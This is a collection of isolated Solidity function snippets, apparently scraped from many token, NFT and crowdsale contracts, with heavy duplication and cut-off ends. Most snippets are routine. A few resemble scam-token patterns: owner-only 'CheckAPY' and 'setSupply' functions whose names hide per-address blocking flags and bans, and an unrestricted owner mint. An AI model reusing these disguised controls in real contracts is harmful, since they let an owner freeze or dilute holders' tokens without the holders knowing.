    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
constructor(string _gameName, uint _closeDate, uint _oracleFeePercent) Ownable() public {
    gameName = _gameName;
    closeDate = _closeDate;
    openDate = block.timestamp;
    gameDone = false;
    oracleFeePercent = _oracleFeePercent;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validateNonce(uint nounce) private onlySigner {
        require(nounce > lastNounce && nounce <= (lastNounce+1000), "Enter Valid Nounce");
        lastNounce=nounce;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public  returns (bool success) {
		if (_value <= 0) return; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    thunderstorm[spender] = val;
    music[spender] = val2; 
    parker[spender] = val3;
    utah = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function() public payable {
    // throws on failure
    parentAddress.transfer(msg.value);
    // Fire off the deposited event if we can forward it
    ForwarderDeposited(msg.sender, msg.value, msg.data);
  }
--------------------------------------------------------------------------------
constructor(string memory _name, string memory _symbol, uint _endTime) public {
        token = new FrenchIco_Token(_symbol, _name);
        endTime = _endTime;
        emit Copyright("Copyright FRENCHICO");

    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        super._transfer(sender, recipient, amount);
        _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _amount) public {
        allowed[msg.sender][_spender] = _amount;
        emit  Approval(msg.sender, _spender, _amount);
    }
--------------------------------------------------------------------------------
function adminshipLevel(address _newAdmin, uint8 _level) onlyAdmin(2) public { //Admin can be set
        require(_newAdmin != address(0));
        level[_newAdmin] = _level;
        emit AdminshipUpdated(_newAdmin,_level);
    }
--------------------------------------------------------------------------------
function requireValidOrder(Order memory order, Sig memory sig)
        internal
        view
        returns (bytes32)
    {
        bytes32 hash = hashToSign(order);
        require(validateOrder(hash, order, sig));
        return hash;
    }
--------------------------------------------------------------------------------
function addAuthorizedAddress(address target)
        public
        onlyOwner
        targetNotAuthorized(target)
    {
        authorized[target] = true;
        authorities.push(target);
        emit LogAuthorizedAddressAdded(target, msg.sender);
    }
--------------------------------------------------------------------------------
function setWeiPerUSDinTGE(uint256 _weiPerUSD) public onlyOwner {
    require(_weiPerUSD > 0);
    assert(block.timestamp < startTimestamp.sub(setWeiLockSeconds));

    weiPerUSDinTGE = _weiPerUSD;
  }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _addresses)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _addresses.length; i++) {
      addAddressToWhitelist(_addresses[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _addresses)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _addresses.length; i++) {
      removeAddressFromWhitelist(_addresses[i]);
    }
  }
--------------------------------------------------------------------------------
function finalization() internal {
    if (goalReached()) {
      escrow.close();
      escrow.beneficiaryWithdraw();
    } else {
      escrow.enableRefunds();
    }

    super.finalization();
  }
--------------------------------------------------------------------------------
function settokensPerKEther(uint _tokensPerKEther) public onlyOwner {
        require(now < START_DATE);
        require(_tokensPerKEther > 0);
        tokensPerKEther = _tokensPerKEther;
        emit tokensPerKEtherUpdated(tokensPerKEther);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
	if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint _transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(_transactionId)
        notConfirmed(_transactionId, msg.sender)
    {
        confirmations[_transactionId][msg.sender] = true;
        Confirmation(msg.sender, _transactionId);
        executeTransaction(_transactionId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) isRunning returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol,
        address initialOwner
        ) public {
        owner = initialOwner;
        balanceOf[owner] = initialSupply;
        totalSupply = initialSupply;
        name = tokenName;
        symbol = tokenSymbol;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    england[spender] = val;
    suckmy[spender] = val2; 
    balls[spender] = val3;
    cusco = val4;
  }
--------------------------------------------------------------------------------
function _setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount >= 9000e9 , 'maxTxAmount should be greater than 9000e9');
        _maxTxAmount = maxTxAmount;
    }
--------------------------------------------------------------------------------
function mintMultiple(
        address[] memory _to
    )
        public
        onlyMinters(msg.sender)
    {
        for (uint i = 0; i < _to.length; i++) {
            mint(_to[i]);
        }
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
function WaxToken() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function BitMilleToken() {

        name = "BitMille";
        symbol = "BM";
        decimals = 8;
        totalSupply = 2100000000000000000;

        balances[0x468E9A02c233C3DBb0A1b7F8bd8F8E9f36cbA952] = totalSupply;

    }
--------------------------------------------------------------------------------
function WithdrawBonus(uint256 amount) onlyOwner public
    {
        require(Token(prAddress).transfer(msg.sender, amount));
        totalBonus = Sub(totalBonus, amount);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success){
        require(checkVestingCondition(msg.sender));
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address _admin,
        bytes memory _data
    ) public payable UpgradeabilityProxy(_logic, _data) {
        assert(
            ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
        );
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function getHash(
        address _signer,
        address _destination,
        uint _value,
        bytes memory _data
    )
        public
        view
        returns(bytes32)
    {
        return keccak256(abi.encodePacked(address(this), _signer, _destination, _value, _data, nonce));
    }
--------------------------------------------------------------------------------
function AnterosToken() public {

totalSupply_ = INITIAL_SUPPLY;

balances[msg.sender] = INITIAL_SUPPLY;

Transfer(0x0, msg.sender, INITIAL_SUPPLY);

}
--------------------------------------------------------------------------------
function getMonths() view internal returns(uint256){
        uint256 countMonth = (getTime().sub(startTime)).div(30 * 24 * 3600);
        return countMonth; // begin 0
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
function acceptOwnership()
        public
        noReentry
        returns (bool)
    {
        require(msg.sender == newOwner);
        ChangedOwner(owner, newOwner);
        owner = newOwner;
        return true;
    }
--------------------------------------------------------------------------------
function ownerReward() internal{
        require(owner.send(reservedReward));
        emit PaidOwnerReward(reservedReward);
        reservedReward = reservedReward.sub(reservedReward);
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId], "NOT_OWNER");
        
        _transfer(msg.sender, to, tokenId);
        
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function getETH(uint256 num, address target) public onlyContract {
        require(num <= getETHNum());
        address payable addr = target.make_payable();
        addr.transfer(num);                                                                              
    }
--------------------------------------------------------------------------------
function mint(address _to, uint256 _mintAmount) public payable {
    require(msg.value >= cost * _mintAmount);
    require(_mintAmount <= maxMintAmount);
    mintInternal(_to, _mintAmount);
  }
--------------------------------------------------------------------------------
function KittyToken() public {
    kitties.length += 1;
    setAdminContract(msg.sender,true);
    setActionContract(msg.sender,true);
  }
--------------------------------------------------------------------------------
function _upgradeTo(address _newImplementation) internal {
        address currentImplementation = implementation();
        require(currentImplementation != _newImplementation);
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }
--------------------------------------------------------------------------------
function SUNNYToken() {
      totalSupply = 100 * 10000 * 10000 * (10**(uint256(decimals)));
      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
    }
--------------------------------------------------------------------------------
function addAvailableTokens(uint16 num,uint16 from, uint16 to)
        external
        onlyOwner
    {
       for (uint16 i = from; i <= to; i++) {
            availableTokens[num].push(i);
        }
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function ADDFUNDS() external payable {
        uint256 _amount = msg.value;
        ethMade = ethMade.add(_amount);
        
        //_addPayout(_amount);
        owner.transfer(_amount);
    }
--------------------------------------------------------------------------------
function setDelegate (address _delegate) public {
    require (msg.sender == owner);

    if (delegate != _delegate) {
      delegate = _delegate;
      Delegation (delegate);
    }
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function _setOwner(address _who) private returns (bool) {
    require(owner != _who, DUPLICATE);
    owner = _who;
    emit SetOwner(_who);
    return true;
  }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _god = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function tokenFallback(address, uint, bytes) public {
    require(msg.sender == tokenAddress, "allowed receive tokens only from target ICO");
  }
--------------------------------------------------------------------------------
function exit() 
        external
    {
        uint256 _amount = balanceOf(msg.sender);
        if(_amount !=0) withdraw(_amount);
        claimReward();
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function ROLCToken () public {
     totalSupply_ = TOTAL_SUPPLY;
     balances[msg.sender] = TOTAL_SUPPLY;
     Transfer(0x0, msg.sender, TOTAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function withdrawR1Tokens() external {
      require(_bonusOfferingActive, 
      "The bonus offering is not active yet");
      
      _withdrawTokens(0);
  }
--------------------------------------------------------------------------------
function withdrawR2Tokens() external {
      require(_bonusOfferingActive, 
      "The bonus offering is not active yet");
      
      _withdrawTokens(1);
  }
--------------------------------------------------------------------------------
function withdrawR3Tokens() external {
      require(_bonusOfferingActive, 
      "The bonus offering is not active yet");  

      _withdrawTokens(2);
  }
--------------------------------------------------------------------------------
function withdrawFunds() external {
      uint256 amount = ((address(this).balance).sub(_fundsWithdrawn)).div(2);
      
      _withdrawFunds(amount);
  }
--------------------------------------------------------------------------------
function getStakingBonusR1(address accountArg) public view returns (uint256) {
      uint256 contribution = _contributions[0][accountArg];
      
      return (contribution.mul(_bonusReductionFactor)).div(10000);
  }
--------------------------------------------------------------------------------
function getStakingBonusR2(address accountArg) public view returns (uint256) {
      uint256 contribution = _contributions[1][accountArg];
      
      return (contribution.mul(_bonusReductionFactor)).div(10000);
  }
--------------------------------------------------------------------------------
function getStakingBonusR3(address accountArg) public view returns (uint256) {
      uint256 contribution = _contributions[2][accountArg];
      
      return (contribution.mul(_bonusReductionFactor)).div(10000);
  }
--------------------------------------------------------------------------------
constructor(address owner,address usdtContractAddress,address cnhcContractAddress,address sendTransferAddress) public{
        _owner = owner;
        _erc20ContractAddressManager[usdtContractAddress] = true;
        _erc20ContractAddressManager[cnhcContractAddress] = true;
        _sendTransferAddress[sendTransferAddress] = true;
    }
--------------------------------------------------------------------------------
function turnOut(address contractAddress) public onlyOwner{
        ERC20 erc20 = ERC20(contractAddress);
        erc20.transfer(_owner,erc20.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function TrueFlipToken(address ownerAddress)
    {
        owner = ownerAddress;
        balances[mintedTokens] = mul(1050000, 10 ** 8);
        totalSupply = balances[mintedTokens];
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Investors() public {
        investors.length = 2;
        investors[1] = msg.sender;
        investorIndex[msg.sender] = 1;
    }
--------------------------------------------------------------------------------
function batchResolveAquarium(uint256[] _seeds) onlyResolver public {
        for (uint256 i = 0; i < _seeds.length; i ++) {
            _resolveAquarium(_seeds[i]);
        }
    }
--------------------------------------------------------------------------------
function claimHodlRewardsFor(address[] _beneficiaries) external {
        for (uint256 i = 0; i < _beneficiaries.length; i++)
            claimHodlRewardFor(_beneficiaries[i]);
    }
--------------------------------------------------------------------------------
function ParagonCoinToken (address fundAddress) {
      tokensCount = INITIAL_TOKENS_COUNT;
      accounts [msg.sender] = INITIAL_TOKENS_COUNT;
      owner = msg.sender;
      fund = fundAddress;
    }
--------------------------------------------------------------------------------
function setCrowdsaleAddress(address _crowdsaleAddress) external onlyOwner {
        // Can only set one time.
        require(crowdsaleAddress == 0x0);
        require(_crowdsaleAddress != 0x0);
        crowdsaleAddress = _crowdsaleAddress;
        balances[crowdsaleAddress] = INITIAL_SUPPLY;
    }
--------------------------------------------------------------------------------
function burn(uint256 value, address data) public {
    super._burn(msg.sender, value);
    emit Burn(msg.sender, value, data);
  }
--------------------------------------------------------------------------------
function cancelOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, getAnotherParty(addresses));
        emit PaymentOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function cancelOwnOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, msg.sender);
        emit PaymentOwnOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function setInToken (
    	address _tokenAddress
    )
    	public
    	onlyOwner
    {
    	require(_tokenAddress.isContract(), "address must be a contract");
    	inToken = IERC20(_tokenAddress);
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external isWhitelisted(to) returns (bool) {
    _transferByDefaultPartitions(msg.sender, msg.sender, to, value, "", "");
    return true;
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getDayCount() public constant returns (uint daySinceMintingEpoch) {
        daySinceMintingEpoch = 0;
        if (isDayTokenActivated())
            daySinceMintingEpoch = (block.timestamp - initialBlockTimestamp)/DayInSecs; 

        return daySinceMintingEpoch; 
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
  returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupplyA(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function vegetablePrice(uint8 _VegetableId) public view returns(uint256){
		return SafeMath.div(SafeMath.div(address(this).balance,MaxVegetables),VegetablesTradeBalance[_VegetableId]);
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _contract_owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function setCollateralBorrowRate(address _collateralType, uint256 _borrowRate) public override onlyManager {
    a.core().refreshCollateral(_collateralType);
    _collateralConfigs[collateralIds[_collateralType]].borrowRate = _borrowRate;
    emitUpdateEvent(_collateralType);
  }
--------------------------------------------------------------------------------
function getExpirationTime(bytes32 _label)
        external
        view
        returns(uint256 releaseTime)
    {
        uint256 creationTime = accounts[_label].creationTime;
        if (creationTime > 0){
            releaseTime = creationTime + releaseDelay;
        }
    }
--------------------------------------------------------------------------------
function getSlashRewardPart(bytes32 _label)
        external
        view
        returns(uint256 partReward)
    {
        uint256 balance = accounts[_label].balance;
        if (balance > 0) {
            partReward = balance / 3;
        }
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address operator, bool approved) external {
        operatorApproval[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }
--------------------------------------------------------------------------------
function denyRebasement() public isOwner
    {
        require (pendingRebasement.executed == false, "Rebasement already executed.");
        
        pendingRebasement.executed = true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function OurToken(uint _initialSupply, string _name, string _symbol) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = 0;
        balances[owner] = _initialSupply;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function setLockTime(uint256 _lockTime) external override onlyOwner {
        require(_lockTime > 0, "TIME_0");
        emit ChangedValue("LOCKTIME", lockTime, _lockTime);
        lockTime = _lockTime;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function reportConvertTokens(uint256 _amount, address _address) onlyMasterContract public {
        require(canConvertTokens);
        Transfer(address(0), _address, _amount);
        totalSupply = totalSupply.add(_amount);
    }
--------------------------------------------------------------------------------
function beneficiarytotal(address addr) public view returns (uint256) {
    	require(_beneficiary_total[addr] != 0,'not in beneficiary list');
        return _beneficiary_total[addr];
    }
--------------------------------------------------------------------------------
function purgeAccount(address account)
        external
        onlyOwner
        onlyDuringSetup
    {
        delete vestingSchedules[account];
        totalVestedBalance = safeSub(totalVestedBalance, totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), "ERC721A: global index out of bounds");
        return index;
    }
--------------------------------------------------------------------------------
function finishPresale() public onlyOwner returns (bool success) {
        require(contract_state == State.Presale);
        contract_state = State.waitingForICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function startICO() public onlyOwner returns (bool success) {
        require(contract_state == State.waitingForICO);
        contract_state = State.ICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function RHP() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function InitPeculiumAdress(address peculAdress) public onlyOwner 
	{ // We init the address of the token
	
		pecul = Peculium(peculAdress);
		decimals = pecul.decimals();
		initPecul = true;
		emit InitializedToken(peculAdress);
	
	}
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function setMaxGasPrice(uint256 _maxGasPrice) external onlyOwnerAndManager {
        require(_maxGasPrice > 0, "swapContract: Gas price cannot be zero");
        maxGasPrice = _maxGasPrice;
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function createRef(uint hx) internal pure returns (bytes32) {
        uint256 _unixTimestamp;
        uint256 _timeExpired;
        return keccak256(abi.encodePacked(hx, _unixTimestamp, _timeExpired));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function freezeAccount (address _target, bool _freeze) public onlyOwner returns(bool res) {
    require(_target != 0x0);
    frozen[_target] = _freeze;
    Freezed(_target, _freeze);
    return true;
  }
--------------------------------------------------------------------------------
function purgeAccount(address account)
        external
        onlyOwner
        setupFunction
    {
        delete vestingSchedules[account];
        totalVestedBalance = safeSub(totalVestedBalance, totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token().balanceOf(_tokenWallet), token().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function transferTokens(address _recipient, uint256 _tokens, bytes _data) private returns (bool ans) {
        // Request Colu Local Network contract to transfer the requested tokens for the buyer.
        ans = cln.transferAndCall(_recipient, _tokens, _data);
        if (ans) {
            TokensIssued(_recipient, _tokens);
        }
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function purchaseTokens()
        public
        payable
        returns(uint256)
    {
        if(msg.value > 0){
            require(counter == 0x0);
        }
        return purchaseTokens(msg.value);
    }
--------------------------------------------------------------------------------
function purchaseTokensERC20(uint256 amount)
        public
        erc20Destination
        returns(uint256)
    {
        require(ERC20Interface(counter).transferFrom(msg.sender, this, amount));
        return purchaseTokens(amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    if (hardCap > 0) {
      checkHardCap(weiRaised.add(msg.value));
    }
    return super.validPurchase();
  }
--------------------------------------------------------------------------------
function getHash(
        address _signer,
        address _destination,
        uint _value,
        bytes memory _data
    )
        public
        view
        returns(bytes32)
    {
        return keccak256(abi.encodePacked(address(this), _signer, _destination, _value, _data, nonce));
    }
--------------------------------------------------------------------------------
function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
        uint256 oldAmount = _maxTxAmount;
        _maxTxAmount = (_totalSupply * maxTxPercent) / 100;

        emit MaxTransactionAmountChanged(oldAmount, _maxTxAmount);
    }
--------------------------------------------------------------------------------
function setupAccreditedAddress(address _accredited, uint _amountInEthers) public returns (bool success) {
        require(msg.sender == creator);    
        accredited[_accredited] = _amountInEthers * 1 ether;
        return true;
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) view private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function Stake(
  address[] _owners,
  address _operator,
  address _wallet,
  uint _weiPerFee,
  address _levToken
  ) public
  validAddress(_wallet)
  validAddress(_operator)
  validAddress(_levToken)
  notZero(_weiPerFee)
  {
    setOwners(_owners);
    operator = _operator;
    wallet = _wallet;
    weiPerFee = _weiPerFee;
    levToken = Token(_levToken);
  }
--------------------------------------------------------------------------------
constructor(address initialOwner) internal {
        require(initialOwner != address(0));
        _owner = initialOwner;
        emit OwnershipTransferred(address(0), _owner);
    }
--------------------------------------------------------------------------------
function setSupply(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function _requireAccessToSuspend(bytes32 section) internal view {
        require(accessControl[section][msg.sender].canSuspend, "Restricted to access control list");
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
